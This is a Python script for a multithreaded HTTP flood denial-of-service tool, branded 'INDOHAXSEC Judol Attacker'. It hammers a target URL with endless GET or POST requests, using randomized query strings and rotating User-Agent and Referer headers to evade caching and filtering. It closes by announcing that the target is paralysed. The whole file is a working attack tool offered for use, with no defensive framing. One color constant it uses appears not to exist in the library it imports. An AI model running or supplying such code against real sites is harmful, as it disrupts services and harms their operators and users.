import argparse
import random
import string
import threading
import time
import requests
from colorama import Fore, Style, init

# Initialize colorama for colored console output
init(autoreset=True)

# Global variables
current_threads = 0
max_threads = 0
stop_attack = False

# User-Agent and Referer headers
headers_useragents = [
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
]

headers_referers = [
    "http://www.google.com/?q=",
    "http://www.usatoday.com/search/results?q=",
    "http://engadget.search.aol.com/search?q=",
]

def random_string(size):
    """Generate a random string of given size."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

def attack(target_url, headers, data=None):
    """Send HTTP GET or POST requests to the target."""
    global current_threads

    try:
        current_threads += 1
        session = requests.Session()
        request_type = "POST" if data else "GET"

        while not stop_attack:
            try:
                url = target_url
                if not data:
                    url += f"?{random_string(10)}={random_string(10)}"
                headers["User-Agent"] = random.choice(headers_useragents)
                headers["Referer"] = random.choice(headers_referers) + random_string(5)

                if request_type == "POST":
                    response = session.post(url, data=data, headers=headers, timeout=5)
                else:
                    response = session.get(url, headers=headers, timeout=5)

                if response.status_code == 200:
                    print(Fore.LIME + f"Sent packet successfully to {target_url}")
                else:
                    print(Fore.RED + f"Error {response.status_code} while sending packet to {target_url}")
            except requests.RequestException as e:
                print(Fore.RED + f"Request failed: {e}")
            time.sleep(0.1)
    finally:
        current_threads -= 1

def main():
    global max_threads, stop_attack

    parser = argparse.ArgumentParser(description="INDOHAXSEC Judol Attacker")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-t", "--threads", type=int, default=100, help="Number of threads")
    parser.add_argument("-d", "--data", help="Data to POST (optional)")
    args = parser.parse_args()

    target_url = args.url
    max_threads = args.threads
    data = args.data

    print(Fore.MAGENTA + "-- INDOHAXSEC " + Fore.GREEN + "JUDOL ATTACKER --")
    print(Fore.RED + "TOOLS BY K3T0PR4K-STARTING ATTACK.....\n")

    headers = {
        "Cache-Control": "no-cache",
        "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
        "Connection": "keep-alive",
    }

    # Start attack threads
    threads = []
    for _ in range(max_threads):
        thread = threading.Thread(target=attack, args=(target_url, headers, data))
        threads.append(thread)
        thread.start()

    try:
        while any(thread.is_alive() for thread in threads):
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + "\n-- Attack interrupted by user --")
        stop_attack = True

    for thread in threads:
        thread.join()

    print(Fore.RED + "-- TARGET DI LUMPUHKAN! --")

if __name__ == "__main__":
    main()
